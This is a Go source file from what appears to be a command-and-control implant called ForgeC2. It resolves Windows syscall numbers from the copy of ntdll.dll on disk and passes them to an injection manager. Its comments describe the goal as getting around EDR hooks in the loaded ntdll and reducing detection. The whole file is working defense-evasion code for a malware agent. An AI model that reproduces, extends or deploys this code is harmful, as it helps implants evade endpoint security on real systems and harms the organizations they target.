//go:build windows && !arm64
// +build windows,!arm64

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ── Direct/indirect syscall policy (option B: independent switch) ───────────

// syscallPolicyEnabled is parsed from SyscallPolicyStr / FORGEC2_SYSCALL_POLICY
// in agent_main.go. It is independent of sleepMaskPolicyEnabled: the two
// mechanisms share a purpose (reduce detection) but not a failure mode, so
// each gets its own switch.

// initSyscallPolicy resolves SSNs once from ntdll on disk at startup.
//
// It never reads from the mapped image (an EDR may have patched it), and it
// refuses to run indirect syscalls when the table is incomplete rather than
// falling back to a silent wrong syscall number on the target. The resolved
// table is registered with the syscall manager so stubs use the parsed numbers
// instead of re-scanning the mapped image.
func initSyscallPolicy() error {
	ntdllPath := filepath.Join(os.Getenv("WINDIR"), "System32", "ntdll.dll")
	if _, err := os.Stat(ntdllPath); err != nil {
		return fmt.Errorf("ntdll not found at %s: %w", ntdllPath, err)
	}

	image, err := ReadNtDllImage(ntdllPath)
	if err != nil {
		return fmt.Errorf("read ntdll image: %w", err)
	}

	table, complete, err := ResolveRequiredSyscalls(image)
	if err != nil {
		return fmt.Errorf("resolve syscalls: %w", err)
	}

	syscallPolicyResolved = true
	syscallPolicySource = ntdllPath

	if !complete {
		failed := make([]string, 0, len(table.Failed))
		for name := range table.Failed {
			failed = append(failed, name)
		}
		syscallPolicyFailed = failed
		// Refuse to run indirect syscalls when the table is incomplete.
		useIndirectSyscall = false
		return fmt.Errorf("syscall table incomplete: %d of %d required syscalls unresolved: %v",
			len(table.Numbers), len(RequiredSyscalls), strings.Join(failed, ", "))
	}

	// Register the pre-resolved table with the syscall manager so stubs use
	// the parsed numbers instead of re-scanning the mapped (possibly
	// EDR-patched) image. The manager and its ssnTable field are defined in
	// syscall_stubs_windows.go; same package, so direct field access works.
	getInjectManager().ssnTable = table
	logDebugf("[syscall] policy engaged: %d/%d syscalls resolved from %s",
		len(table.Numbers), len(RequiredSyscalls), ntdllPath)
	return nil
}
